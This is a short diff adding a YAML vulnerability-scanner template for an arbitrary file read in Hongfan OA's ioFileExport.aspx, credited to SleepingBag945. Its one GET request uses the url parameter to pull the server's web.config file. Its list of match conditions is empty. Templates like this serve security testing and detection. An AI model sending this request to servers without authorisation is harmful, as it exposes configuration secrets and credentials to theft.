@@ -1,0 +1,15 @@
+id: hongfan-ioffice-lfi
+brief:
+    title: Hongfan OA ioFileExport.aspx - Arbitrary File Read
+    by: SleepingBag945
+    level: medium
+    about: Arbitrary File Read vulnerability in the Hongfan OA ioFileExport.aspx file, through which an attacker can obtain sensitive server information
+    label:
+        - hongfan
+        - lfi
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/web.config&filename={{filename}}.txt&ContentType=application/octet-stream'
+      signs: []
